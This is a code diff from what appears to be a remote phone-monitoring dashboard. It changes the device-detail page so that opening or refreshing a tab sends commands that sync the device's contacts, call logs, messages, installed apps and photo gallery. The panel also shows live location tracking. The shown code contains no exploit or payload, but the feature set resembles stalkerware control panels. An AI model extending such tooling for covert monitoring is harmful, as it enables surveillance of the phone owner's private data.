@@ -44,7 +44,11 @@ export default function DeviceDetailPage() {
     const next = { ...tabPrefs, [tabId]: nextVal };
     setTabPrefs(next);
     saveTabPrefs(next);
-    if (nextVal) fetchTabData(tabId, true, true);
+    if (nextVal) {
+      const syncMap: Record<string, string> = { contacts: "sync_contacts", calls: "sync_calls", messages: "sync_messages", apps: "sync_apps", gallery: "sync_gallery" };
+      if (syncMap[tabId]) sendCommand(syncMap[tabId], {}, `Sync ${tabId}`);
+      fetchTabData(tabId, true, true);
+    }
   };
 
   if (loading && !device) {
@@ -96,7 +100,11 @@ export default function DeviceDetailPage() {
         isLiveMovement={isLiveMovement}
         isTabEnabled={isTabEnabled(activeTab)}
         onToggleTab={() => toggleTab(activeTab)}
-        onFetchOnce={() => fetchTabData(activeTab, true, true)}
+        onFetchOnce={() => {
+          const syncMap: Record<string, string> = { contacts: "sync_contacts", calls: "sync_calls", messages: "sync_messages", apps: "sync_apps", gallery: "sync_gallery" };
+          if (syncMap[activeTab]) sendCommand(syncMap[activeTab], {}, `Sync ${activeTab}`);
+          fetchTabData(activeTab, true, true);
+        }}
         onToggleLiveMovement={handleToggleLiveMovement}
         onSendCommand={sendCommand}
         onDeleteCommand={handleDeleteCommand}
